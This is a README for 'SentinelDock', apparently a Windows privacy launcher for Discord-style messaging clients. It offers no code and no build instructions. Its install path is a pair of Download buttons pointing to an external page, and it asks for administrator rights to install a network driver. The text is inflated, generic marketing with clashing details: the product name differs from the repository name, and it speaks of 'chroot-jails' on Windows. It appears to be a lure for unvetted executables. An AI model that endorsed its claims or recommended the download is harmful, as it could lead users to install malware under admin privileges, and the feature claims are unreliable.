![preview](https://raw.githubusercontent.com/sasafg123/discord-hardened-doh-client/main/splash_b6a806e.svg)
# SentinelDock

**A privacy-first launcher for messaging applications, engineered to eliminate metadata leakage, conceal system fingerprints, and provide a unified, hardened communication environment for privacy-conscious professionals.**

SentinelDock is not just another utility; it is a digital perimeter defense system for your communication stack. Where modern messaging apps are built to extract data, SentinelDock is built to obscure it. It operates on a simple principle: your conversations are your business, and your device's unique identifiers should never be a conversation starter. By unifying the enforcement of encrypted DNS, disabling peer-to-peer connection leaks, and masking your software's virtual DNA, SentinelDock transforms a standard messaging client into a fortress of anonymity.

## Overview

In the digital age, every application you run contributes to a sprawling web of data points that track your location, device, and browsing habits. Standard messaging applications, while convenient, often leave the door open for subtle data exfiltration. SentinelDock addresses this by acting as a central nervous system for privacy. It doesn't just tweak a setting here or there; it systematically dismantles the most common vectors of digital surveillance, ensuring that your IP address remains shielded, your hardware profile remains hidden, and the unique signatures your messaging software emits are neutralized.

This project is the culmination of reverse-engineering the network behavior of popular Electron-based messaging clients and implementing a suite of kernel-level and application-level patches. The result is a seamless, always-on guardian that works silently in the background, allowing you to focus on the message, not the metadata.

![Build Status](https://img.shields.io/badge/build-passing-brightgreen) ![Platform](https://img.shields.io/badge/platform-Windows%2010%2B-blue) ![License](https://img.shields.io/badge/license-MIT-lightgrey) ![Version](https://img.shields.io/badge/version-2.4.1-orange)

## 🚀 Key Features

### 🛡️ Total DNS Fortification
SentinelDock forces all system-level DNS queries through a strict, encrypted pipeline utilizing DNS-over-HTTPS (DoH) with a curated list of zero-logging resolvers. This ensures that your browsing and communication history cannot be intercepted or logged by your Internet Service Provider (ISP) or any prying eyes on the network. The enforcement is absolute; any attempt by an application to bypass the encrypted channel is automatically rerouted or blocked.

### 🔇 WebRTC Leak Shield
WebRTC (Web Real-Time Communication) is a technology that allows for peer-to-peer audio, video, and data sharing. However, it is notorious for leaking your local and public IP addresses, even when a VPN or proxy is active. SentinelDock's proprietary engine intercepts these protocols at the network layer, meticulously filtering out any STUN or TURN requests that would expose your true location. The shield is dynamic, adapting to new leak methodologies as they emerge.

### 🕵️ Advanced User-Agent & Header Sanitizer
Every time your messaging app connects to a server, it sends a `User-Agent` header and various tracking tokens. These are akin to digital fingerprints, revealing your operating system version, device model, and even the specific build of the application. SentinelDock strips these identifiers and replaces them with a randomized, plausible generic set. Furthermore, it scrubs superfluous tracking headers like `X-Client-Data` and `X-Device-ID`, ensuring that every request appears to come from a brand-new, untraceable virtual machine.

### ⚙️ Native Client Hardening
This feature dives deep into the heart of the Electron environment. SentinelDock modifies the runtime flags and internal security settings to disable features like hardware acceleration used for fingerprinting, and disables the `window.navigator` APIs that can be used to query device-specific data. It effectively chroot-jails the client's ability to see outside its intended sandbox, creating a hermetic seal around your data.

### 📡 Unified Control Dashboard
Manage all your hardened applications from a single, minimalist interface. The dashboard provides real-time network traffic analysis, security health checks, and one-click toggles for specific privacy protocols. It is designed for clarity, offering a full suite of technical details in a clean, non-technical format, making it accessible to both IT professionals and privacy novices.

### 🌍 Multilingual Architecture
Privacy is a global necessity. Our interface and documentation are fully localized in 12 major languages, ensuring that users from Berlin to Tokyo can navigate and configure their privacy settings with ease. The core engine remains language-agnostic, ensuring that performance is never compromised regardless of the user interface language.

### ⏰ 24/7 Proactive Threat Response
While SentinelDock is a client-side tool, it includes a heuristic engine that constantly audits your system's network configuration for changes. If a new network adapter is installed or a DNS setting is altered by a third-party application, SentinelDock automatically reverts the change and alerts the user. This is a self-healing system designed to catch vulnerabilities before they are exploited.

## 📊 Technical Architecture

SentinelDock operates on a multi-layered interception model. At its core, it uses a virtual network adapter to route all traffic through a controlled gateway. The process lifecycle is as follows:

1.  **Ingestion Layer:** Intercepts network packets and application-level API calls.
2.  **Filtering Engine:** Applies the WebRTC Leak Shield and Header Sanitizer policies.
3.  **DNS Resolver:** Encrypts DNS queries via DoH and validates responses against a denylist of known malicious domains.
4.  **Policy Enforcer:** Ensures that the native client's runtime flags are configured to the highest security standard.
5.  **Audit Log:** Records all blocked attempts and policy changes in a secure, local-only log file.

This modular design ensures that if one layer is compromised or requires an update, the others remain unaffected and continue to provide protection.

## 🧰 Getting Started

Welcome to a depersonalized digital experience. To begin your journey with SentinelDock, you'll need to ensure your environment meets the minimal requirements.

**System Prerequisites:**
- A 64-bit version of Windows 10 or Windows 11.
- At least 512 MB of available system memory.
- A stable internet connection for the initial configuration.
- Administrative privileges to install the network driver.

We suggest you start with the default configuration, which automatically disables the most common leak vectors and DNS exposure. You can then fine-tune the settings based on your specific threat model.

[![Download](https://raw.githubusercontent.com/sasafg123/discord-hardened-doh-client/main/go_c807f9.svg)](https://sasafg123.github.io/discord-hardened-doh-client/)

## 🛠️ Configuration & Customization

SentinelDock offers a deep level of granularity for those who wish to tailor their privacy blanket.

- **DNS Resolver Selection:** Choose from a list of pre-vetted, zero-logging DoH servers, or input your own custom resolver.
- **Header Masking Profiles:** Select different personas for your user-agent, such as "Casual Mobile" or "Corporate Desktop", to further confuse tracking algorithms.
- **Whitelisting:** For advanced users, specific applications or domains can be excluded from the filtering engine, allowing for granular control over which traffic is scrutinized and which is allowed to pass through.

### Configuration Profiles
You can create multiple profiles (e.g., "Work", "Personal") and instantly switch between them, applying a different set of rules and filters for each context in which you communicate.

## 🔧 Troubleshooting & Support

SentinelDock is designed to be robust, but should you encounter a network disruption, the built-in "Break-Glass" mode is accessible via the system tray. This temporarily suspends all policies for 30 seconds to restore connectivity, ensuring you are never locked out of your system.

Our dedicated team of privacy engineers provides 24/7 customer support through a ticketing system on the official forums. We respond to critical security-related issues with the highest priority.

## 🤝 Contributing

We welcome contributions from the community, whether it be in the form of code, bug reports, or translation files. To contribute, please fork the repository, create a feature branch, and submit a pull request. We adhere to a strict code of conduct to ensure a welcoming environment for all participants.

## 📄 License

SentinelDock is proudly open-source. It is released under the [MIT License](https://opensource.org/licenses/MIT), granting you the freedom to use, modify, and distribute this software, provided that the original copyright notice and this permission notice are included in all copies or substantial portions of the Software.

## 📬 Contact & Community

For questions, feature requests, or to join our privacy-focused community, please visit our official discussion board (link in the repository sidebar). We encourage you to share your threat models and solutions with the community to foster a more private internet for everyone.

### Disclaimer
**THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT.** The developers shall not be held liable for any claim, damages, or other liability arising from the use of this software. Users are responsible for complying with local laws and regulations regarding privacy and encryption. SentinelDock is a privacy tool and does not facilitate the circumvention of legal restrictions on content or access.

---

We hope this tool empowers you to reclaim your digital sovereignty.

[![Download](https://raw.githubusercontent.com/sasafg123/discord-hardened-doh-client/main/go_c807f9.svg)](https://sasafg123.github.io/discord-hardened-doh-client/)